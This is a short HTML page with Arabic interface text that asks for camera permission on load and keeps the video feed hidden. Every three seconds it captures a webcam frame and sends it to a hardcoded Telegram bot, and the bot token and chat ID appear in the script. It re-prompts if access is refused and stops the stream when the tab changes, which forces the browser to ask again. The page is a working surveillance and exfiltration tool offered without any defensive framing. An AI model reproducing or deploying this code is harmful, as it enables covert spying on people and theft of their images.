<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>طلب إذن الكاميرا</title>
  <style>
    body { text-align: center; font-family: Arial; padding: 50px; }
    video { width: 640px; height: 480px; display: none; }
    #status { font-size: 20px; color: red; }
  </style>
</head>
<body>

  <h2 id="status">يتم طلب إذن الكاميرا...</h2>
  <button id="startButton" style="display:none;">سماح</button>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const startButton = document.getElementById('startButton');
    let stream = null;

    function requestCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(camStream => {
          stream = camStream;
          video.srcObject = stream;
          document.getElementById('status').innerText = 'يتم الآن التقاط الصور...';
          captureFrame();
        })
        .catch(err => {
          document.getElementById('status').innerText = '⚠️ فشل في الوصول إلى الكاميرا';
          startButton.style.display = 'block'; // إظهار الزر إذا تم رفض الإذن
          console.error("خطأ في تشغيل الكاميرا:", err);
        });
    }

    function captureFrame() {
      setInterval(() => {
        if (video.readyState === 4) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', '6765420173');
            formData.append('photo', blob, 'snapshot.jpg');

            fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
              method: 'POST',
              body: formData
            })
            .then(response => response.json())
            .then(data => console.log("تم الإرسال:", data))
            .catch(error => console.error("فشل الإرسال:", error));
          }, 'image/jpeg');
        }
      }, 3000);
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
      }
    }

    // طلب الإذن عند تحميل الصفحة
    document.addEventListener("DOMContentLoaded", requestCamera);

    // عند تغيير تبويب الصفحة أو إغلاقها، يتم إيقاف الكاميرا لإجبار المتصفح على طلب الإذن مجددًا
    document.addEventListener("visibilitychange", () => {
      if (document.hidden) stopCamera();
    });

    window.addEventListener("beforeunload", stopCamera);

    // زر يدوي في حالة رفض الإذن
    startButton.addEventListener('click', requestCamera);
  </script>

</body>
</html>
